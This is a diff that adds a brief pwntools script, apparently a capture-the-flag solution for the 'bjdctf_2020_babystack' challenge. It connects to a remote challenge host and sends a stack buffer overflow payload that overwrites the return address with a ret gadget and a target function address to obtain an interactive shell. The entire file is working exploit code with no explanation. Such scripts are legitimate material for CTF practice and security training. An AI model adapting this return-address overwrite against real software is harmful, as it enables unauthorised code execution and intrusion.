@@ -1,0 +1,8 @@
+from pwn import *
+p=remote("node4.buuoj.cn",27997)
+ret=0x400561
+#p=process("./bjdctf_2020_babystack")
+p.sendlineafter("[+]Please input the length of your name:",'100')
+payload=b'a'*(0x10+8)+p64(ret)+p64(0x4006E6)
+p.sendline(payload)
+p.interactive()
